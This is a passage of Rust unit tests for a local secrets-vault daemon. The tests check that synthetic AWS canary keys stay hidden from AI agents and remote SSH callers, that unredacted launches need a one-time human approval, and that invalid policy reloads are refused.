        let v = peer_vault(&f.p, &f.peer).unwrap();
        let file = v.build_file("aws/static", store::Tier::Open, true, false, &dek, &creds.to_json().unwrap(), &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&f.p, &file).unwrap();
        f.st.lock().unwrap().leases.get_mut("aws/static").unwrap().scope.cmds.clear();
        f
    }

    fn legacy_unlock(f: &Fixture, action: UnlockAction) -> Result<Value> {
        legacy_software_proof(f);
        f.send(legacy_unlock_req("aws/static", action, false))
    }

    #[test]
    fn session_mint_describe_for_an_agent_returns_metadata_only() {
        let f = mint_legacy_fixture(true);
        let response = legacy_unlock(&f, UnlockAction::AwsDescribe).unwrap();
        let text = response.to_string();
        let value = B64.decode(response["values"][0]["value"].as_str().unwrap()).unwrap();
        let shown = String::from_utf8(value.clone()).unwrap();
        for secret in ["long-term-secret-canary", "AKIASYNTHETICKEY001"] {
            assert!(!shown.contains(secret) && !text.contains(&B64.encode(secret)), "{secret} reached the agent: {shown}");
        }
        let c = crate::aws::AwsCreds::from_json(&value).unwrap();
        assert_eq!((c.access_key_id.as_str(), c.secret_access_key.as_str(), c.session_mint), ("AKIA…Y001", "", true));
        // The describe output the CLI prints is unchanged for the agent.
        assert_eq!(crate::aws::mask_key_id(&c.access_key_id), "AKIA…Y001");
        // A human (and so `aws session-mint on|off`) still reads the full entry.
        let mut human = mint_legacy_fixture(true);
        human.peer = agent::Peer::default();
        let full = legacy_unlock(&human, UnlockAction::AwsDescribe).unwrap();
        let full = B64.decode(full["values"][0]["value"].as_str().unwrap()).unwrap();
        assert!(String::from_utf8(full).unwrap().contains("long-term-secret-canary"));
        // Control: a profile without session_mint is described as before.
        let plain = mint_legacy_fixture(false);
        let plain = B64.decode(legacy_unlock(&plain, UnlockAction::AwsDescribe).unwrap()["values"][0]["value"].as_str().unwrap()).unwrap();
        assert!(String::from_utf8(plain).unwrap().contains("synthetic-secret-canary"));
    }

    #[test]
    fn session_mint_value_is_refused_to_an_agent_for_every_other_unlock_action() {
        let f = mint_legacy_fixture(true);
        for action in [UnlockAction::Get, UnlockAction::Reveal, UnlockAction::Run, UnlockAction::View] {
            let error = legacy_unlock(&f, action).unwrap_err().to_string();
            assert!(error.contains(SESSION_MINT_REFUSAL), "{action:?}: {error}");
        }
        let audit = std::fs::read_to_string(f.p.audit()).unwrap();
        assert!(!audit.contains("long-term-secret-canary") && !audit.contains(&B64.encode("long-term-secret-canary")));
    }

    #[test]
    fn session_mint_key_never_reaches_the_clipboard_for_an_agent() {
        let f = mint_legacy_fixture(true);
        let clips = Rc::new(Cell::new(0));
        let count = clips.clone();
        crate::platform::helper::CLIP_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_, _| { count.set(count.get() + 1); Ok(()) })));
        let error = legacy_unlock(&f, UnlockAction::Copy).unwrap_err().to_string();
        crate::platform::helper::CLIP_HOOK.with(|h| h.borrow_mut().take());
        assert!(error.contains(SESSION_MINT_REFUSAL), "{error}");
        assert_eq!(clips.get(), 0, "the key must not be copied for an agent");
    }

    #[test]
    fn session_mint_dek_is_not_released_by_an_unscoped_lease_use() {
        let f = mint_legacy_fixture(true);
        let response = f.send(Req::Use { names: vec!["aws/static".into()], cmd: None }).unwrap();
        assert!(response["deks"].as_object().unwrap().is_empty(), "DEK released: {response}");
        assert_eq!(response["denied"]["aws/static"], SESSION_MINT_REFUSAL);
        assert_eq!(f.st.lock().unwrap().leases["aws/static"].uses, 0);
        // The same refusal reaches the whole legacy Unlock path that rides on Use.
        f.policy(store::Tier::Bio, false, false);
        let bio = {
            let creds = mint_source_creds("AKIASYNTHETICKEY001").to_json().unwrap();
            let v = peer_vault(&f.p, &f.peer).unwrap();
            let dek = f.st.lock().unwrap().leases["aws/static"].dek.clone();
            v.build_file("aws/static", store::Tier::Bio, false, false, &dek, &creds, &v.pubkeys_local().unwrap(), None).unwrap()
        };
        store::save_secret(&f.p, &bio).unwrap();
        let error = legacy_unlock(&f, UnlockAction::Run).unwrap_err().to_string();
        assert!(error.contains("not allowed") && error.contains(SESSION_MINT_REFUSAL), "{error}");
        assert_eq!(f.st.lock().unwrap().leases["aws/static"].uses, 0);
        // Control: the same lease on a plain key still releases its DEK.
        let plain = mint_legacy_fixture(false);
        let response = plain.send(Req::Use { names: vec!["aws/static".into()], cmd: None }).unwrap();
        assert!(response["deks"]["aws/static"].is_string(), "{response}");
        assert_eq!(plain.st.lock().unwrap().leases["aws/static"].uses, 1);
    }

    #[test]
    fn client_supplied_deks_are_still_refused_for_session_mint_grants() {
        let f = mint_legacy_fixture(true);
        let grant = Req::Grant { leases: vec![GrantItem { name: "aws/static".into(), dek: B64.encode([1; 32]), to: Grantee::Any, root: None,
            expires: now() + 60, scope: Scope::default(), by: "synthetic".into() }] };
        assert!(f.send(grant).is_err());
    }

    // ---- `--no-redact` is recorded when approved, not inferred from an untaken frame ----

    fn human_fixture() -> Fixture {
        let mut f = Fixture::new();
        f.peer.caller.agent = None;
        f
    }

    fn approve_unredacted(f: &Fixture, command: &str) {
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        f.send(Req::RunUnredacted { command: command.into() }).unwrap();
    }

    fn unredacted_prepare(f: &Fixture) -> Result<Value> {
        let mut req = f.req();
        if let Req::LaunchPrepare { no_redact, .. } = &mut req { *no_redact = true; }
        f.send(req)
    }

    #[test]
    fn no_redact_prepare_needs_this_owners_unspent_approval_for_this_command() {
        // No approval at all, and an agent that never could get one.
        assert!(unredacted_prepare(&human_fixture()).is_err());
        assert!(unredacted_prepare(&Fixture::new()).is_err());
        // An approval for another command does not carry over.
        let f = human_fixture();
        approve_unredacted(&f, "/bin/other");
        assert!(unredacted_prepare(&f).is_err());
        // The matching approval is spent by one prepare.
        let f = human_fixture();
        approve_unredacted(&f, "/usr/bin/true");
        let prepared = unredacted_prepare(&f).unwrap();
        assert!(prepared["id"].is_string());
        assert!(unredacted_prepare(&f).is_err(), "approval already spent");
        // An ordinary launch never needs one and never becomes unredacted.
        let f = human_fixture();
        assert!(f.send(f.req()).is_ok());
    }

    #[test]
    #[cfg(debug_assertions)]
    fn no_redact_sso_endpoint_keeps_serving_after_the_prepare_deadline() {
        for no_redact in [true, false] {
            let (mut f, mut req) = sso_fixture("open");
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            f.http_port = listener.local_addr().unwrap().port();
            let (st, p) = (f.st.clone(), f.p.clone());
            let http = std::thread::spawn(move || { for _ in 0..2 { serve_aws(listener.accept().unwrap().0, &st, &p).unwrap(); } });
            if no_redact {
                approve_unredacted(&f, "/usr/bin/true");
                if let Req::LaunchPrepare { no_redact, .. } = &mut req { *no_redact = true; }
            }
            let prepared = f.send(req).unwrap();
            let prompts = Arc::new(Mutex::new(vec![]));
            let setups = std::iter::once(sso_auth_setup(&f, "use", prompts.clone(), None)).collect();
            let mut shim = Shim::start_setups(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, setups);
            assert_eq!(shim.response(), "bound");
            shim.child.stdin.as_mut().unwrap().write_all(b"S").unwrap();
            let until = Instant::now() + Duration::from_secs(10);
            while !std::fs::read_to_string(shim.ready.with_extension("result")).is_ok_and(|r| r == "aws-delivered") {
                assert!(shim.child.try_wait().unwrap().is_none(), "SSO shim exited");
                assert!(Instant::now() < until, "SSO delivery timeout");
                std::thread::sleep(Duration::from_millis(10));
            }
            http.join().unwrap();
            let endpoint = {
                let g = f.st.lock().unwrap();
                let (id, ep) = g.aws.iter().next().unwrap();
                assert_eq!(ep.unredacted, no_redact, "recorded only for an approved --no-redact launch");
                json!({"id": id, "token": ep.token})
            };
            // The prepare window is over: its redaction record is gone (as expiry removes it).
            f.st.lock().unwrap().launch_redactions.clear();
            let (result, response) = super::tests::http_endpoint(&f.p, &f.st, &endpoint);
            result.unwrap();
            if no_redact {
                assert!(response.starts_with("HTTP/1.1 200"), "no-redact endpoint must keep refreshing: {response}");
            } else {
                assert!(response.starts_with("HTTP/1.1 503") && response.contains("redaction feed ended"), "a redacted launch needs its feed: {response}");
            }
            shim.finish(b'e');
        }
    }

    // ---- An SSH caller is not the human at the keyboard ----

    fn remote_fixture(remote_allowed: bool, tier: store::Tier, allowed: bool, public: bool) -> Fixture {
        let mut f = Fixture::new();
        f.policy(tier, allowed, public);
        f.peer.caller.agent = None;
        f.peer.caller.remote = true;
        f.peer.caller.remote_allowed = remote_allowed;
        f
    }

    #[test]
    fn remote_caller_cannot_prepare_a_launch_that_needs_a_human() {
        for (tier, allowed, public, label) in [
            (store::Tier::Open, false, false, "only me, no Touch ID"),
            (store::Tier::Bio, false, false, "only me + Touch ID"),
            (store::Tier::Bio, true, false, "Touch ID, agents allowed"),
        ] {
            let f = remote_fixture(false, tier, allowed, public);
            let error = f.send(f.req()).unwrap_err().to_string();
            assert!(error.contains(crate::SSH_HUMAN_REFUSAL), "{label}: {error}");
            assert!(!f.st.lock().unwrap().pending_launches.has_pending(), "{label}");
            // allow-ssh-human restores the ordinary prompt path.
            let allowed_remote = remote_fixture(true, tier, allowed, public);
            let prepared = allowed_remote.send(allowed_remote.req()).unwrap();
            assert!(prepared["id"].is_string(), "{label}");
            let records = allowed_remote.records();
            let intent = records.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
            assert_eq!(intent["detail"]["decisions"]["test/ref"], "needs_fresh_auth", "{label}");
        }
        // Agent-allowed and public secrets need no human, so a remote caller keeps them.
        for (allowed, public, expected) in [(true, false, "agent_allowed"), (false, true, "open_public")] {
            let f = remote_fixture(false, store::Tier::Open, allowed, public);
            assert!(f.send(f.req()).unwrap()["id"].is_string());
            let records = f.records();
            let intent = records.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
            assert_eq!(intent["detail"]["decisions"]["test/ref"], expected);
        }
    }

    #[test]
    fn remote_caller_cannot_spend_a_cached_human_approval() {
        let mut f = Fixture::human_cached();
        // The screen-lock probe consumes this hook once per local Use.
        let probe = |st: Arc<Ctx>| crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { assert!(st.try_lock().is_ok()); Ok(vec![Zeroizing::new(vec![0; 32])]) })));
        f.peer.caller.remote = true;
        let error = f.send(f.req()).unwrap_err().to_string();
        assert!(error.contains(crate::SSH_HUMAN_REFUSAL), "{error}");
        assert!(f.st.lock().unwrap().human.values().all(|h| h.uses == 0));
        // Legacy Use hands out nothing to a remote caller, and still does to the local one.
        let response = f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap();
        assert!(response["deks"].as_object().unwrap().is_empty(), "{response}");
        f.peer.caller.remote = false;
        probe(f.st.clone());
        let response = f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap();
        assert!(response["deks"]["test/ref"].is_string(), "{response}");
        // allow-ssh-human puts the cache back.
        f.peer.caller.remote = true;
        f.peer.caller.remote_allowed = true;
        probe(f.st.clone());
        let response = f.send(Req::Use { names: vec!["test/ref".into()], cmd: None }).unwrap();
        assert!(response["deks"]["test/ref"].is_string(), "{response}");
    }

    #[test]
    fn remote_caller_legacy_unlock_is_refused_before_any_prompt() {
        for (tier, allowed) in [(store::Tier::Open, false), (store::Tier::Bio, false)] {
            let f = remote_fixture(false, tier, allowed, false);
            let prompts = Rc::new(Cell::new(0));
            let count = prompts.clone();
            legacy_software_proof(&f);
            crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.set(count.get() + 1); Ok(()) })));
            let count = prompts.clone();
            crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { count.set(count.get() + 1); bail!("unexpected unwrap") })));
            for action in [UnlockAction::Run, UnlockAction::View, UnlockAction::Get] {
                let error = f.send(legacy_unlock_req("test/ref", action, false)).unwrap_err().to_string();
                assert!(error.contains(crate::SSH_HUMAN_REFUSAL), "{tier:?} {action:?}: {error}");
            }
            assert_eq!(prompts.get(), 0, "{tier:?}: a prompt or unwrap ran for a remote caller");
        }
        // Agent-allowed Open stays readable by `run`; allow-ssh-human restores the prompt path.
        let f = remote_fixture(false, store::Tier::Open, true, false);
        legacy_software_proof(&f);
        assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Run, false)).is_ok());
        let f = remote_fixture(true, store::Tier::Open, false, false);
        legacy_software_proof(&f);
        assert!(f.send(legacy_unlock_req("test/ref", UnlockAction::Run, false)).is_ok());
    }

    #[test]
    fn remote_caller_cannot_launch_or_open_an_only_me_sso_profile() {
        let (mut f, req) = sso_fixture("open");
        f.peer.caller.remote = true;
        let error = f.send(req).unwrap_err().to_string();
        assert!(error.contains(crate::SSH_HUMAN_REFUSAL), "{error}");
        let (mut f, reg) = legacy_sso_fixture();
        f.peer.caller.agent = None;
        f.peer.caller.remote = true;
        let open = || Req::SsoOpen { name: reg.name.clone(), dek: None, ttl: 60 };
        let error = f.send(open()).unwrap_err().to_string();
        assert!(error.contains(crate::SSH_HUMAN_REFUSAL), "{error}");
        f.peer.caller.remote_allowed = true;
        assert!(f.send(open()).is_ok());
    }
}

#[cfg(test)]
mod policy_reload_tests {
    use super::*;
    #[test]
    fn invalid_policy_reload_refused_and_last_good_retained() {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-policy-reload-{}", std::process::id())) };
        std::fs::create_dir_all(&p.root).unwrap();
        let mut good = serde_json::to_value(store::Config::default()).unwrap();
        good["policy"] = serde_json::json!({"rules":[{"subject":{"secret":"dev/*"},"action":"run","who":"agent","effect":"deny"}]});
        std::fs::write(p.config(), good.to_string()).unwrap();
        let st = Ctx::new(State::default());
        load_policy_config(&p, &st).unwrap();
        for invalid in [
            serde_json::json!({"policy":{"unexpected":true}}),
            serde_json::json!({"policy":{"rules":[{"subject":{"tool":"deploy"},"action":"get","who":"agent","effect":"allow"}]}}),
        ] {
            good["policy"] = invalid["policy"].clone();
            std::fs::write(p.config(), good.to_string()).unwrap();
            assert!(load_policy_config(&p, &st).is_err());
            assert!(store::load_config(&p).is_err());
            let state = st.lock().unwrap();
            let old = state.last_good_policy.as_ref().unwrap();
            assert_eq!(old.rules.len(), 1);
            assert_eq!(old.rules[0].effect, crate::policy::Effect::Deny);
        }
        std::fs::remove_dir_all(&p.root).unwrap();
    }
}

#[cfg(test)]
mod build_and_policy_report_tests {
    use super::*;
    use crate::policy::diagnostics::{check_live, policy_sha256};

    #[test]
    fn ping_reports_build_id_and_hash_of_the_policy_it_loaded() {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-ping-policy-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        std::fs::create_dir_all(&p.root).unwrap();
        let policy = serde_json::from_value(json!({"rules":[{"subject":{"secret":"dev/*"},"action":"run","who":"agent","effect":"deny"}]})).unwrap();
        let cfg = store::Config { policy: Some(policy), ..Default::default() };
        store::save_config(&p, &cfg).unwrap();
        let st = Ctx::new(State::default());
        let me = std::process::id() as i32;

        let reply = handle(&p, &st, me, Req::Ping, 0).unwrap();
        assert!(reply["build_id"].as_str().is_some_and(|b| b.starts_with(env!("CARGO_PKG_VERSION"))), "{reply}");
        assert_eq!(reply["pid"], json!(std::process::id()), "existing fields are unchanged");
        assert_eq!(reply["policy_sha256"], json!(policy_sha256(cfg.policy.as_ref().unwrap())));
        check_live(cfg.policy.as_ref().unwrap(), &reply).unwrap();

        // A policy edit after the daemon loaded it is a mismatch until the daemon reloads.
        let edited = store::Config::default();
        assert!(check_live(&edited.policy.clone().unwrap_or_default(), &reply).is_err());
        // No policy at all hashes like an empty one, so a daemon with none still reports a hash.
        store::save_config(&p, &edited).unwrap();
        let reply = handle(&p, &st, me, Req::Ping, 0).unwrap();
        check_live(&crate::policy::Policy::default(), &reply).unwrap();
        std::fs::remove_dir_all(&p.root).unwrap();
    }
}

#[cfg(all(test, debug_assertions))]
#[path = "../tests/sso_import/mod.rs"]
mod sso_import_tests;
